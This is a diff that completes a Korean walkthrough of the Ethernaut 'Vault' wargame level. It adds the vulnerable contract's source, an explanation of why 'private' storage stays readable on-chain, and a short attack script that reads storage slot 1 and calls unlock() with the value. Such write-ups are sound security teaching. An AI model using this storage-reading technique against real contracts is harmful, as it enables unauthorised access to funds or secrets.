@@ -739,7 +739,7 @@ await getBalance(contract.address)
 
 ### 문제 요약
 
-작성 예정.
+잠긴 Vault를 열면 클리어된다. `password`는 `private`이지만 온체인 스토리지에는 그대로 저장되어 있다.
 
 ### 핵심
 
@@ -747,19 +747,65 @@ await getBalance(contract.address)
 - 스토리지 슬롯 조회
 - 온체인 데이터 공개성
 
+### 소스 코드
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Vault {
+    bool public locked;
+    bytes32 private password;
+
+    constructor(bytes32 _password) {
+        locked = true;
+        password = _password;
+    }
+
+    function unlock(bytes32 _password) public {
+        if (password == _password) {
+            locked = false;
+        }
+    }
+}
+```
+
 ### 풀이
 
-작성 예정.
+`private`은 다른 컨트랙트가 직접 접근하지 못하게 막는 Solidity 수준의 제한이다. 블록체인에 저장된 데이터 자체를 숨기지는 못한다.
+
+스토리지 배치는 선언 순서대로 잡힌다.
+
+- slot 0: `locked`
+- slot 1: `password`
+
+그래서 slot 1을 직접 읽으면 `password` 값을 얻을 수 있다.
+
+```javascript
+await web3.eth.getStorageAt(contract.address, 1)
+```
+
+얻은 값을 그대로 `unlock()`에 넘기면 된다.
 
 ### 공격 코드
 
 ```javascript
-// 작성 예정
+const password = await web3.eth.getStorageAt(contract.address, 1);
+
+await contract.unlock(password);
+
+await contract.locked();
 ```
+
+- `getStorageAt(contract.address, 1)`: slot 1에 저장된 `password`를 읽는다.
+- `unlock(password)`: 읽은 값을 그대로 넘겨 잠금을 해제한다.
+- `locked()`: `false`가 나오면 성공이다.
 
 ### 정리
 
-작성 예정.
+`private`은 비밀 저장소가 아니다. 온체인에 올라간 값은 누구나 스토리지 슬롯을 읽어 확인할 수 있다. 
+
+비밀번호, 키, 시드 같은 민감한 값은 컨트랙트에 평문으로 저장하면 안 된다.
 
 </section>
 <section class="ethernaut-page" data-ethernaut-page data-level-title="King" markdown="1">
